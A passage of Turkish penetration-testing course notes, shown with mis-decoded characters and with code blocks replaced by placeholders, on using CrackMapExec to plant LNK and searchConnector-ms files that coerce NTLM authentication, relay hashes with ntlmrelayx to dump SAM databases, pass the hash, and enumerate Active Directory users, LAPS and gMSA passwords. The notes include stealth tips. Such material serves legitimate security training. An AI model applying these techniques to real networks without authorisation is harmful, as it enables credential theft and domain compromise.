Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

